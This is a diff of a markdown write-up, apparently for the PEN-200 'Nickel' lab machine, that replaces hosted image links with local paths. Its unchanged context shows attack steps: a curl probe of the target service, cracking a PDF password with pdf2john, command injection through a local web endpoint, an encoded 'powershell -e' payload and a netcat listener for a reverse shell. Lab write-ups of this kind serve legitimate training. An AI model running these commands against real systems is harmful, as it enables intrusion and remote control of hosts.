@@ -151,7 +151,9 @@ Target: http://192.168.174.99:33333/
                                                                              
 Task Completed
 ```
-![image](https://hackmd.io/_uploads/BJnmZDxqbl.png)
+
+![image](_assets/BJnmZDxqbl.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/Nickel]
 └─$ curl -X POST -i http://192.168.174.99:33333 -H "Content-Type: application/json" -H "Content-Length:100"
@@ -345,7 +347,9 @@ ariah@NICKEL C:\Users\ariah>dir c:\ftp
                1 File(s)         46,235 bytes
                2 Dir(s)   7,630,757,888 bytes free
 ```
-![image](https://hackmd.io/_uploads/r17sEDg5Zx.png)
+
+![image](_assets/r17sEDg5Zx.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/Nickel]
 └─$ pdf2john Infrastructure.pdf > pdfhash
@@ -370,7 +374,9 @@ ariah4168        (Infrastructure.pdf)
 Use the "--show --format=PDF" options to display all of the cracked passwords reliably
 Session completed. 
 ```
-![image](https://hackmd.io/_uploads/HkZsSPgcWg.png)
+
+![image](_assets/HkZsSPgcWg.png)
+
 ```
 ╔══════════╣ Current TCP Listening Ports                                                                                                                                                                  
 ╚ Check for services restricted from the outside                                                                                                                                                   
@@ -441,15 +447,22 @@ Task Completed
 ```
 <br></br>
 1. `http://127.0.0.1/%3f/`
-![image](https://hackmd.io/_uploads/Skm_-cbcWx.png)
+
+   ![image](_assets/Skm_-cbcWx.png)
+
 2. `http://127.0.0.1/whoami`
-![image](https://hackmd.io/_uploads/H1HCM9W9bx.png)
+
+   ![image](_assets/H1HCM9W9bx.png)
+
 3. `http://127.0.0.1/?whoami`
-![image](https://hackmd.io/_uploads/rkYkmcbcbe.png)
+
+   ![image](_assets/rkYkmcbcbe.png)
 
 
 4. `http://127.0.0.1/?powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw...`
-![image](https://hackmd.io/_uploads/Skx4E5bcZe.png)
+
+   ![image](_assets/Skx4E5bcZe.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/Nickel]
 └─$ nc -lvnp 4444                                                                                  
